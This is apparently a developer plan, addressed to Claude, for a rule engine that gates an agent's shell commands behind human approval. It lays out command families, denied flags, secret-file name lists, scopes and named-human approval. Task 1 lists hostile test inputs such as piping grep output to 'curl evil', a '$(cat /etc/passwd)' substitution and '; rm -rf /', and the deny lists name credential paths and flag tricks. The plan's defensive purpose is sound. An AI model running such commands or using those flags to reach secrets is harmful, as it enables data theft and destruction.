# Piece 2: Rule Engine in the Core (no UI)

> **For Claude:** Use superpowers:subagent-driven-development. Subagents do not commit; the controller commits named files after both reviews pass. Tests first, real file I/O, no mocks.

**Goal:** A deterministic, tested engine that decides whether a command needs a human given the project's standing rules, scopes, profile and the safety floor. Design: `2026-10-26-hitm-decision-cards-and-rules-design.md` (R1 to R11).

**Architecture:** Pure value types in `HITMCore` (Foundation only). A tokenizer turns a command string into arguments or rejects it as "not simple". A fixed family table says what each kind of command may do, its maximum scope and its denied flags. A `RuleBook` decides: floor first, then rules by scope. Rules persist as `policy` entries in the existing `MindStore` (quarantine, named-human approval, supersede). No UI, no model, no network.

**Out of scope:** UI ("Allow like this…" card), onboarding screens, history preview, wake-ups. Those are pieces 3 and later.

## Defaults chosen for the first table (owner to confirm; recorded as proposed)
| Family | Commands allowed (exact argv[0], no path) | Max scope | Denied flags / forms |
|---|---|---|---|
| readOnlySearch | `grep`, `rg`, `ls`, `cat`, `head`, `tail`, `wc` | all | `rg --pre`, `rg --pre-glob`, `rg -z`/`--search-zip` (runs decompressors); any absolute or `..` path is allowed to read only if rule scope is not folder-limited (see below) |
| localGit | `git` with argv[1] in `status`, `diff`, `log`, `show`, `add`, `commit`, `branch` (list only: no `-d`, `-D`, `-m`, `-M`, `-f`) | project | any option before the subcommand (`-c`, `--exec-path`, `-C`); `diff --output`, `log --output`; `commit --amend`, `--no-verify`; `add -f`; hooks are not controlled here (noted gap) |
| buildAndTest | `swift` with argv[1] in `build`, `test`; `xcodebuild` with `build` or `test` and no `-exportArchive` | project | none beyond subcommand list |

**Secret paths (added 2026-10-30):** any argument whose basename is `.env`, `.env.*`, `*.pem`, `*.key`, `*.p12`, `id_rsa*`, `id_ed25519*`, `.netrc`, `.npmrc`, `.pypirc`, `credentials`, `credentials.*` or `*.keychain*`, or that has a path component `.ssh`, `.aws`, `.gnupg`, `.kube` or `.hitm`, matches no family (so it asks), at every scope including `all`; this also covers `--flag=value` and `-fvalue` forms. Also denied: `rg --hostname-bin`, and `--ext-diff` / `--textconv` on `git diff`, `log` and `show`.

**Stricter defaults added in review (PENDING OWNER CONFIRMATION, 2026-10-30):**
- `rg` is removed from the table (it is recursive by default and argv cannot show it). `grep -r/-R/--recursive/--dereference-recursive`, `-d`/`--directories` (incl. `recurse`) and `ls -R/--recursive` ask.
- File-list reads ask: `grep -f/--file/--exclude-from`, `wc --files0-from`. `git diff/log/show --no-index` ask; `git diff` with an absolute or `..` path asks.
- `git add` accepts only explicitly named paths: `.`, `..`, `dir/.`, `:`-pathspecs, `-A/--all/-u/--update` ask.
- Secret names also include any basename starting `.env`, `.git/config`, `.git-credentials`, `.docker`, `.pgpass`, shell histories, `*.tfstate*`, `*.pfx`, `*.p8`, `*.jks`, `*.gpg`, `*.asc`, `id_ecdsa*`, `id_dsa*`, `secrets.yml/yaml/json`. Arguments are split on `/` and `:`, and short-flag attached values are checked at every offset.
- buildAndTest: `swift` denies `--disable-sandbox`, `--package-path`, `--scratch-path`, `--build-path`, `-Xswiftc/-Xcc/-Xcxx/-Xlinker/-Xbuild-tools-swiftc`, `--plugin*`, `--cache-path`, `--config-path`, `--security-path`. `xcodebuild` denies `-derivedDataPath`, `-resultBundlePath`, `-archivePath`, `-exportArchive` (any case, one or two dashes), `-xcconfig`, `-toolchain`, and any `NAME=value` build setting; the action (`build`/`test`) must be a real action word, not a flag value (`-scheme build` asks).

**Second review round (2026-10-30):**
- Git expands pathspecs itself even when quoted, so for every git subcommand any argument containing `*`, `?`, `[` or a backslash, or starting with `:`, asks (commit message text after `-m`/`--message` excepted). `git add --pathspec-from-file`, `--pathspec-file-nul`, `-p/--patch`, `-i/--interactive`, `-e/--edit` and `git commit -F/--file`, `--template`, `-t`, `--pathspec-from-file` are denied. An unquoted `^` is not a simple command.
- Secret names are compared after Unicode folding (NFC and NFD forms, long s and Kelvin mapped, full case folding, invisible characters removed). More names: `*.env`, `.flaskenv`, any name containing `credentials`, `.vault-token`, `.secrets`, `secrets.toml`, `*.keystore`, `*.kdbx`, `.azure`, `.config/gcloud`, `.config/gh`, `.config/op`.
- Rule subcommands are matched against the command's subcommand/action words (for `xcodebuild`, wherever the action word sits), not argv[1]. An ask rule fires if any word matches; an allow rule needs every word to match.
- More denied: `swift --toolset/--toolchain/-Xmanifest/--netrc*/--swift-sdk/--sdk/--triple/--allow-writing-to-directory/--xunit-output/--experimental-*`; `xcodebuild -skipMacroValidation/-skipPackagePluginValidation/-allowProvisioningUpdates/-allowProvisioningDeviceRegistration/-authenticationKey*`; `tail -f/-F/--follow`; any path under `/dev/` for cat, head, tail, wc, grep. `cat /etc/passwd` stays allowed by design.
- Store: revoking an ask rule (or an unreadable rule) needs a named human who is not the author; revoking an allow rule stays open. `widen` is refused while a widening of the same rule is pending.

**KNOWN GAPS (owner to be told):** the secret check is a NAME list only; it does not know what a file contains, so any secret under another name is readable by `cat`, `head`, `tail`, `wc`, `grep`. `git add <directory>` stages unignored secrets inside that directory because argv does not name them (wildcards, `.`, `-A`, `-u` and pathspec-from-file are now denied). `swift build/test` and `xcodebuild` run project code by nature. Hooks, aliases, git config and environment are outside the engine. Recursive search is closed by the stricter defaults above, pending confirmation.

Not in any family, so always ask: `find` (has `-exec`, `-delete`), `sed`, `awk`, `curl`, `ssh`, `rm`, `mv`, `cp`, `chmod`, `xargs`, `sh`, `bash`, `python`, `git push`, `git reset`, `git checkout`, `git restore`, `git clean`, `git rebase`, and anything unknown. Unknown means ask.

## Types and rules to implement
- `RuleScope`: `.session(id)`, `.projectFolder(path)`, `.project`, `.all`; ordered narrow to wide; `maxScope` per family; a rule wider than its family ceiling is invalid and never applies.
- `RuleEffect`: `.allow` or `.ask`. An `ask` rule beats any `allow`; a narrower rule beats a wider one of the same effect; the floor beats everything.
- `CommandParse`: `.simple(argv)` or `.notSimple(reason)`. Reject (not simple) any unquoted `| ; & < > ( ) ` newline, backtick, `$`, `{`/`}` expansion, `~` expansion, `*`/`?`/`[` globs, and a leading `VAR=value` environment assignment. Inside double quotes reject `$` and backtick; inside single quotes everything is literal. Unterminated quotes, NUL, control characters and empty commands are not simple. Never run anything: parsing only.
- `RuleBook.decide(command:, context:)` where context carries: profile (`RiskProfile`), action class from the classifier, project id, folder path, session id. Order: (1) `FloorGate.evaluate`: `.humanRequired` means ask, no rule consulted; (2) not simple or no family match means ask; (3) collect applicable rules (scope matches context, family ceiling respected, rule not expired); (4) an applicable `ask` rule means ask; (5) otherwise the narrowest applicable `allow` rule means allow, returning the rule id; (6) no rule means ask. Result is a `RuleDecision` with `.allow(ruleID)` or `.ask(reason)`; every `.ask` has a plain reason.
- **Profile gating (R10, R11):** under a strict, unsure or sensitive profile an `.all` rule applies only if it has been explicitly enabled for that project (`enabledForProjects` contains the project id). A project with no onboarding record is treated as strict with no allow rules (skip means strict).
- **Persistence:** `RuleStore` over `MindStore`: `propose(rule:author:)` writes a `policy` entry (quarantined); `accept` needs an `Approval` from a named human (`MindPolicy.approve`); `widen(ruleID, to scope)` is a new entry that supersedes the old one and needs approval again; `revoke` expires the entry; `activeRules()` returns decoded accepted rules only. A policy body that fails strict decoding is ignored (the rule does not apply, which means ask). Sensitive entries never reach a hosted-model slice (existing mind behavior).
- **Use records:** `decide` returns the matched rule id; `RuleUsage` (count, last used) is a separate value the caller updates; a test shows counts increase per allow and never on ask.

## Tasks (each: red tests first, then code, then `swift test`)
1. **Tokenizer** (`CommandParser.swift`): tests for each rejected form above, quoting, and plain accepts. Include adversarial inputs: `grep x file | curl evil`, `grep $(cat /etc/passwd) f`, `grep x f; rm -rf /`, `grep x f > out`, `ls ~`, `FOO=1 grep x f`, `grep 'a;b' f` (simple), unicode look-alikes (full-width semicolon is not a shell metacharacter, so it stays literal), embedded NUL and newline.
2. **Family table and matcher** (`CommandFamilies.swift`): table above as code; denied flags; subcommand rules; `git -c core.pager=x status` not matched; `rg --pre cmd` not matched; `git diff --output=f` not matched; `git branch -D x` not matched; `git push` unknown; path form `/usr/bin/grep` not matched.
3. **Rule types and `RuleBook.decide`** (`RuleBook.swift`): floor-first (an irreversible/deploy/externalSend class never allowed even with a matching rule, including a rule forged with an over-wide scope); ask beats allow; narrower beats wider; over-ceiling rule never applies; folder scope matches only paths under the folder (reject `..` and symlink-style prefixes such as `/proj-evil` vs `/proj`); session scope matches only its session id; strict/unsure/sensitive profile gating of `.all`; no onboarding record means ask.
4. **Persistence** (`RuleStore.swift`): propose/accept/widen/revoke via real `MindStore` files in a temp directory; accept without a named human fails; undecodable body ignored (fail closed); widening needs a fresh approval; revoked rule no longer applies; a hosted-model slice excludes sensitive rules.
5. **Usage record and audit text**: `RuleUsage` and a plain-language `explanation(for:)` of any decision (used later by the card's "how this was worked out").
6. **Record and review:** `BUILD_NOTES.md` entry with exact commands and counts; spec review, then quality review; fix findings; commit named files.

## Done when
All tests pass with exact counts (HITMCoreTests grows; CockpitUITests stays 34); every red step shown; mutation checks on the floor-first and ask-beats-allow rules; both reviews approved; the table of families is listed as proposed in `BUILD_NOTES.md` and in the open items for owner confirmation; unverified items listed (hooks and shell aliases are outside the engine; real agent commands not yet seen).
